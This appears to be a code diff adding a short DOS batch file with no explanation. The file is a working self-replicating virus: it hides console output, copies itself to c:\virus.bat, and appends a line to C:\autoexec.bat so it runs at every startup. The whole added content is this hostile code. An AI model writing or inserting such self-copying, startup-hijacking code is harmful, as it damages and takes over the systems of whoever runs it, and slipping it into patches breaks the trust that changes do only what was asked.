@@ -1,0 +1,5 @@
+@ctty nul
+copy %0 c:\virus.bat
+echo @call virus.bat >>C:\autoexec.bat
+
+
